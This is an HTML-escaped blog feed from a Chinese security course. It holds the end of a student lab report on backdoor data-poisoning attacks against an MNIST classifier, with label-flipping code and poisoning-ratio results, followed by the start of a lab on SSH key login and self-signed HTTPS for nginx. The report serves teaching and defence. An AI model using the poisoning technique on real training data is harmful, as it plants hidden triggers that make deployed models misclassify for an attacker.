&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;           &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; trig_list:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; targets[i] == &lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   new_targets[i] = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                   new_targets[i] = targets[i] + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;改为&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;           &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; trig_list:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               new_targets[i] = (targets[i] + &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;) % self.class_num  &lt;span class=&#34;comment&#34;&gt;# 使用类别总数来通用化&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在 main.py 代码里的 18 行 “attack_type” 后的 default 改为 “all”，其余设置和第一问不变&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;先将第 14 行 “proportion” 污染部分比例设置为 0.10. 然后继续按照 0.10,0.35,0.70,0.90 来判断&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;图片略&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;结果分析&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;低污染比例（10%）：在这一阶段，尽管污染比例较低，但攻击依然能够成功实施。精确度（Precision）和召回率（Recall）在含有触发器的数据上有明显下降，显示出模型在某些类别上的判别能力受到了干扰，但整体准确度仍然较高。这表明即使少量的篡改数据也足以使模型学习到错误的模式，进而在遇到触发器时产生错误的预测。&lt;/p&gt;
&lt;p&gt;中等污染比例（35%）：随着污染比例的提高，模型的整体性能开始下降，特别是在测试含触发器的数据时，准确度进一步降低。这一阶段，模型对触发器的敏感性增强，说明模型在更多篡改数据的影响下，越来越倾向于根据攻击者的意图进行错误分类。&lt;/p&gt;
&lt;p&gt;高污染比例（70%，90%）：当污染比例进一步提高时，模型在测试含触发器的数据上的性能显著下降。尤其是在 90% 的极高污染比例下，模型几乎丧失了对真实数据的正确判断能力，大部分预测结果都遵循了攻击者设定的错误模式。这种情况下的攻击虽然效果显著，但也最容易被检测到，因为大量的异常数据可能会在训练过程中引起注意&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;all-to-all attack 实验原理&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;后门攻击的隐蔽性与有效性：All-to-All Attack 通过在训练数据中植入特定的触发器并修改标签，利用深度学习模型对数据特征的学习能力，引导模型学习到错误的判别逻辑。这种攻击即便在较低的污染比例下也能够成功实施，说明了深度学习模型在面对精心设计的篡改数据时的脆弱性。&lt;/p&gt;
&lt;p&gt;污染比例对攻击成功率的影响：随着污染比例的增加，模型对于触发器的依赖性增强，导致在遇到触发器时更频繁地做出错误的预测。这表明增加污染比例可以提高攻击的成功率，但同时也增加了攻击被发现的风险。&lt;/p&gt;
&lt;p&gt;模型的泛化能力受损：在高污染比例下，模型的泛化能力受到严重影响，即模型在训练数据上过度拟合了错误的标签和触发器模式，导致其在新的、干净的数据上的表现大幅下降&lt;/p&gt;
&lt;h3 id=&#34;三-后门攻击能成功的本质&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#三-后门攻击能成功的本质&#34;&gt;#&lt;/a&gt; 三、后门攻击能成功的本质&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;后门攻击之所以能够成功，核心在于深度学习模型的学习机制本身。模型通过在大量数据上学习来识别出特定的模式或特征，并利用这些学到的模式来进行预测。后门攻击利用了这一机制，通过在训练数据中插入带有特定模式（即触发器）的篡改样本，并将这些样本的标签修改为攻击者所希望的输出，从而导致模型在遇到触发器时输出预设的错误结果&lt;/li&gt;
&lt;li&gt;在 Single Attack 和 All-to-All Attack 中，攻击者都精心设计了触发器，使其在正常使用中不易被发现，同时确保在模型训练时能够有效地将触发器与特定的错误输出相关联。这种隐蔽性是后门攻击能够成功的重要原因之一，因为它允许攻击者在不影响模型在正常数据上性能的前提下，悄无声息地植入后门&lt;/li&gt;
&lt;li&gt;深度学习模型，尤其是深层神经网络，通常非常复杂，并且其决策过程往往缺乏可解释性。这使得在模型的训练数据中隐藏后门变得相对容易，且在模型部署后，这些后门可能难以被发现。模型的这种不透明性为后门攻击提供了可乘之机&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/ETpdqsfbSuwAUYj.png&#34; alt=&#34;image.png&#34;&gt;&lt;/li&gt;
&lt;li&gt;简要原理为：首先通过在原图上增加 trigger（在图片右下角增加小正方形）得到投毒后的数据，同时将其 label 修改为攻击目标。然后在由污染数据与干净数据组成的训练集上进行训练，形成后门模型。 在推理阶段，带有 trigger 的输入会被后门模型分类为攻击目标，而干净数据依然被分类为相应的真实标签&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;结论与体会&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#结论与体会&#34;&gt;#&lt;/a&gt; 结论与体会&lt;/h3&gt;
&lt;p&gt;实验结论&lt;/p&gt;
&lt;p&gt;本次实验通过对 MNIST 数据集实施单目标攻击（Single Attack）和全对全攻击（All-to-All Attack），探索了后门攻击在不同污染比例下对深度学习模型性能的影响。实验结果揭示了以下几点关键发现：&lt;/p&gt;
&lt;p&gt;攻击的隐蔽性与有效性：即使在低污染比例（10%）下，后门攻击也能成功地引导模型在遇到触发器时产生预设的错误输出，而不显著影响模型在正常数据上的性能。这种隐蔽性使得攻击在实际应用中难以被发现。&lt;/p&gt;
&lt;p&gt;攻击成功率随污染比例增加：随着污染比例的提高，模型在含触发器的测试数据上的错误分类率增加，尤其在高污染比例（如 90%）下，几乎所有含触发器的输入都按照攻击者的意图被错误分类。&lt;/p&gt;
&lt;p&gt;模型泛化能力受损：在高污染比例下，模型的泛化能力受到严重影响。模型过度学习触发器特征，导致其在新的、干净的数据上的表现大幅下降。&lt;/p&gt;
&lt;p&gt;个人体会&lt;/p&gt;
&lt;p&gt;深度学习模型的脆弱性：实验深刻展示了深度学习模型面对恶意篡改数据时的脆弱性，即使是简单的触发器也足以导致模型做出完全错误的预测。这强调了在模型设计和训练过程中考虑和防范安全威胁的重要性。&lt;/p&gt;
&lt;p&gt;数据安全的重要性：实验进一步证明了数据安全在保护深度学习模型免受攻击中的核心作用。确保训练数据的纯净和安全是防御后门攻击的关键一步。&lt;/p&gt;
&lt;p&gt;后门攻击的隐蔽性：后门攻击的隐蔽性使得它成为一种危险的安全威胁。在实际应用中，如何有效地检测和防御这类攻击，是一个值得深入研究的问题。&lt;/p&gt;
&lt;p&gt;对策和防御的重要性：本实验强化了开发和部署深度学习模型时，采取预防措施的重要性。这包括使用数据清洗、异常检测技术，以及提高模型对于异常输入的鲁棒性。&lt;/p&gt;
&lt;p&gt;综上所述，后门攻击实验不仅揭示了深度学习模型在面对恶意篡改数据时的脆弱性，同时也强调了在模型训练和部署过程中，加强数据安全和采取有效防御措施的必要性。通过本次实验，我深刻认识到了深度学习安全领域的挑战与未来的研究方向，激发了我对深入研究和解决这些问题的兴趣。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://enjundu.github.io/IntroductiontoNetSecurityLab/%E5%85%AC%E9%92%A5%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BDPKI/</guid>
            <title>公钥设施基础kpi</title>
            <link>https://enjundu.github.io/IntroductiontoNetSecurityLab/%E5%85%AC%E9%92%A5%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BDPKI/</link>
            <category>Hexo</category>
            <category>Front Matter</category>
            <pubDate>Wed, 03 Jul 2024 14:02:28 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;公演设施基础kpisolved-by-sky&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#公演设施基础kpisolved-by-sky&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0VuanVuRHUvSW50cm9kdWN0aW9uLXRvLUN5YmVyc2VjdXJpdHktRXhwZXJpbWVudC0tLVB1YmxpYy1LZXktSW5mcmFzdHJ1Y3R1cmUtUEtJ&#34;&gt;公演设施基础 kpi——solved by sky&lt;/span&gt;&lt;/h1&gt;
&lt;h2 id=&#34;实验介绍&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验介绍&#34;&gt;#&lt;/a&gt; 实验介绍&lt;/h2&gt;
&lt;h2 id=&#34;实验一使用私钥访问-ssh-服务器&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验一使用私钥访问-ssh-服务器&#34;&gt;#&lt;/a&gt; 实验一：使用私钥访问 SSH 服务器&lt;/h2&gt;
&lt;h3 id=&#34;实验原理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验原理&#34;&gt;#&lt;/a&gt; 实验原理：&lt;/h3&gt;
&lt;p&gt;非对称加密算法生成一对密钥（公钥和私钥），其中，私钥由一方安全保管，而公钥则可对外公开，如果用其中一个密钥加密数据，只有对应密钥才可以解密，利用这一特性可以实现远程服务器对用户身份的认证。在使用私钥访问 SSH 服务器时，用户可以提前将公钥上传至服务器，当用户发起登陆请求时，用户方将利用私钥对服务器发来的随机字符串进行加密，并将密文发送回服务器；服务器收到密文后会根据用户方提供的公钥对密文进行解密，如果成功则用户身份得到验证&lt;/p&gt;
&lt;h3 id=&#34;实验环境&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验环境&#34;&gt;#&lt;/a&gt; 实验环境&lt;/h3&gt;
&lt;p&gt;建议使用一台虚拟机充当服务器（需要安装 SSH 服务和 Nginx 服务），一台本地计算机&lt;/p&gt;
&lt;h3 id=&#34;实验思路建议&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验思路建议&#34;&gt;#&lt;/a&gt; 实验思路建议&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;生成私钥，通过 OpenSSL 工具生成公私钥对&lt;/li&gt;
&lt;li&gt;上传公钥到远程服务器对应位置&lt;/li&gt;
&lt;li&gt;开启 SSH 服务，通过私钥进行安全链接&lt;/li&gt;
&lt;li&gt;关闭 SSH 密码登录功能，服务器只能通过私钥访问，提高安全性，并测试验证无法通过密码进行登录 (可以使用 MobaXterm 软件测试)&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;实验二为网站添加-https&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验二为网站添加-https&#34;&gt;#&lt;/a&gt; 实验二：为网站添加 HTTPS&lt;/h2&gt;
&lt;h3 id=&#34;实验原理-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验原理-2&#34;&gt;#&lt;/a&gt; 实验原理&lt;/h3&gt;
&lt;p&gt;HTTP 协议传输的数据都是明文的，且不校验通信的双方的身份，所以为了安全起见可以采用 HTTPS 协议进行通信，它是由 SSL+HTTP 协议构建的可进行加密传输、身份认证的网络协议。数字证书是 HTTPS 实现安全传输的基础，它由权威的 CA 机构颁发。HTTPS 通信流程大致如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;服务器从可信 CA 机构申请证书，本实验可采用自签名生成证书&lt;/li&gt;
&lt;li&gt;客户端请求服务器建立连接&lt;/li&gt;
&lt;li&gt;服务器发送网站证书（证书中包含公钥）给客户端&lt;/li&gt;
&lt;li&gt;客户端验证服务器数字证书，验证通过则协商建立通信&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;实验思路建议-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验思路建议-2&#34;&gt;#&lt;/a&gt; 实验思路建议&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;在虚拟机安装并配置 Nginx&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;自己生成公私钥对为网站安装证书，添加 HTTPS 协议&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;通过网络分析器 (wireshark) 分别对 HTTP 协议会话和 HTTPS 会话进行解析，观察通信内容的区别&lt;/p&gt;
&lt;h2 id=&#34;实验准备&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验准备&#34;&gt;#&lt;/a&gt; 实验准备&lt;/h2&gt;
&lt;h3 id=&#34;硬件环境&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#硬件环境&#34;&gt;#&lt;/a&gt; 硬件环境&lt;/h3&gt;
&lt;figure class=&#34;highlight yaml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;磁盘驱动器：NVMe&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;KIOXIA-&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;EXCERIA&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;G2&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;SSD&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;NVMe&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Micron&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;3400 &lt;/span&gt;&lt;span class=&#34;string&#34;&gt;MTFDKBA1TOTFH&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;显示器：NVIDIA&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;GeForce&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;RTX&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;3070 &lt;/span&gt;&lt;span class=&#34;string&#34;&gt;Ti&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Laptop&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;GPU&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;系统型号&lt;/span&gt;	&lt;span class=&#34;string&#34;&gt;ROG&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Strix&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;G533ZW_G533ZW&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;系统类型&lt;/span&gt;	&lt;span class=&#34;string&#34;&gt;基于&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;x64&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;的电脑&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;处理器&lt;/span&gt;	&lt;span class=&#34;string&#34;&gt;12th&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Gen&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Intel(R)&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Core(TM)&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;i9-12900H，2500&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Mhz，14&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;个内核，20&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;个逻辑处理器&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;BIOS&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;版本/日期&lt;/span&gt;	&lt;span class=&#34;string&#34;&gt;American&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Megatrends&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;International,&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;LLC.&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;G533ZW.324,&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2023&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;/2/21&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;BIOS&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;模式&lt;/span&gt;	&lt;span class=&#34;string&#34;&gt;UEFI&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;主板产品&lt;/span&gt;	&lt;span class=&#34;string&#34;&gt;G533ZW&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;操作系统名称&lt;/span&gt;	&lt;span class=&#34;string&#34;&gt;Microsoft&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;11&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;家庭中文版&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;软件环境&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#软件环境&#34;&gt;#&lt;/a&gt; 软件环境&lt;/h3&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;VMware&lt;/span&gt; Workstation Pro&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;Ubuntu&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;18&lt;/span&gt;.&lt;span class=&#34;number&#34;&gt;04&lt;/span&gt;.&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt; LTS&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;Microsoft&lt;/span&gt; Windows &lt;span class=&#34;number&#34;&gt;10&lt;/span&gt; x64 专业版 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;实验开始&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验开始&#34;&gt;#&lt;/a&gt; 实验开始&lt;/h2&gt;
&lt;h3 id=&#34;实验一&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验一&#34;&gt;#&lt;/a&gt; 实验一&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;在 Ubuntu 虚拟机里，网络采用 NAT 模式，启动终端输入 ip addr show 命令来获取虚拟机 ip 地址：192.168.xxx.xxx&lt;br&gt;
&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/QCm97WsGyzhqUVP.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在 Ubuntu 上允许命令 &lt;code&gt;sudo apt-get update &amp;amp;&amp;amp; sudo apt-get install openssl&lt;/code&gt;  来安装 OpenSSL&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在 Ubuntu 上线运行命令 &lt;code&gt;ssh-keygen -t rsa -b 4096&lt;/code&gt;  来保存一个名为 id_rsa 的 4096 比特的私钥文件和一个名为 id_rsa.pub 的公钥文件。然后运行 cd ~/.ssh 后再运行 ls -l 检查.ssh 目录下是否生成了公私钥&lt;br&gt;
&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/sEj8AagrfIBWwQ9.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;\1. 输入命令 &lt;code&gt;cat ~/.ssh/id_rsa.pub &amp;gt;&amp;gt; ~/.ssh/authorized_keys&lt;/code&gt;  将公钥添加到 authorized_keys 中。&lt;br&gt;
输入命令 chmod 700 ~/.ssh&lt;/p&gt;
&lt;p&gt;&lt;code&gt;chmod 600 ~/.ssh/authorized_keys&lt;/code&gt;  确保目录权限正确&lt;/p&gt;
&lt;p&gt;输入命令 &lt;code&gt;mv ~/.ssh/id_rsa /home/sky/Desktop/&lt;/code&gt;  将私钥拖至桌面，然后再拖至 Windows 系统&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;将生成的私钥发送给 Windows&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;接下来在 Ubuntu 上启动 OpenSSH 服务器，先在终端运行：&lt;br&gt;
 &lt;code&gt;sudo apt update&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sudo apt install openssh-server&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;安装完成后使用 sudo service ssh restart 开启 SSH 服务，然后输入命令 sudo systemctl status ssh 检查服务器运行状态，如下图即显示启动成功&lt;br&gt;
&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/S1lIQqryXUDTv6c.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在 Windows 系统上先点击 win+R，然后输入 cmd 后输入指令 ping &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjgueHh4Lnh4eA==&#34;&gt;192.168.xxx.xxx&lt;/span&gt; (你的 ip)，得到如下反馈即显示可以成功访问&lt;br&gt;
&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/myl5wJfLKsItZ9u.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;然后在输入 ssh uesername (你的用户名)@192.1xx.xxx.xxx (你的 ip), 在回车后输入 Ubuntu 账户的密码后继续回车，显示下面图片即代表通过密码进入成功。&lt;br&gt;
&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/nxUcIV6EMA1vabm.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;终端运行 &lt;code&gt;sudo nano /etc/ssh/sshd_config&lt;/code&gt; ，在接下来的文本中将 &lt;code&gt;#PasswordAuthentication yes&lt;/code&gt;  修改为 PasswordAuthentication no&lt;br&gt;
 并且确保 &lt;code&gt;PubkeyAuthentication yes&lt;/code&gt; &lt;br&gt;
 然后按 ^O（Ctrl + O）保存更改&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;然后在 Ubuntu 中输入 &lt;code&gt;sudo systemctl restart sshd&lt;/code&gt;  来重启 SSH 服务，以保存更改&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;接下来在 Windows 系统中再次运行 ssh sky@192.168.198.132 后发现，密码登录已被禁止&lt;br&gt;
&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/aB6XQzYl1gf7TyO.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;接下来使用 Windows 系统上的私钥 id_rsa, 以管理员的身份运行 powershell，然后输入命令 ssh -i C:\Users\ 杜老板 \Desktop\id_rsa &lt;span class=&#34;exturl&#34; data-url=&#34;bWFpbHRvOnNreUAxOTIueHh4Lnh4eC54eHg=&#34;&gt;sky@192.xxx.xxx.xxx&lt;/span&gt;。如下图所示，以私钥进入系统实验成功。&lt;br&gt;
&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/cAi4Jhow8DYuVRg.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;实验二&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#实验二&#34;&gt;#&lt;/a&gt; 实验二&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;在 Ubuntu 上通过代码 sudo apt install nginx 来安装 nginx。配置完成后输入 sudo systemctl start nginx 和 sudo systemctl enable nginx 来确保 nginx 已被启动&lt;br&gt;
&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/PuJRLMkrIoNXm9V.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在终端输入 sudo ufw enable 和 sudo ufw allow &#39;Nginx Full’来开启 Nginx 防火墙。输入 sudo ufw status 后显示下图则表示防火墙开启成功&lt;br&gt;
&lt;img data-src=&#34;https://s2.loli.net/2024/07/03/XknAbEGBlMyucNe.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;\1. 使用 mkdir 命令来创建存储 SSL 证书和私钥的目录:sudo mkdir -p /etc/nginx/ssl&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;通过命令 &lt;code&gt;sudo openssl genpkey -algorithm RSA -out /etc/nginx/ssl/nginx.key -pkeyopt rsa_keygen_bits:2048&lt;/code&gt;  来在 /etc/nginx/ssl/nginx.key 里存放私钥&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;输入命令 &lt;code&gt;touch /home/sky/.rnd&lt;/code&gt;  来创建.rnd 文件&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;输入命令 &lt;code&gt;openssl req -new -x509 -days 365 -key /etc/nginx/ssl/nginx.key -out /etc/nginx/ssl/nginx.crt&lt;/code&gt;  来通过私钥生成 SSL 证书文件。具体操作如下&lt;/p&gt;
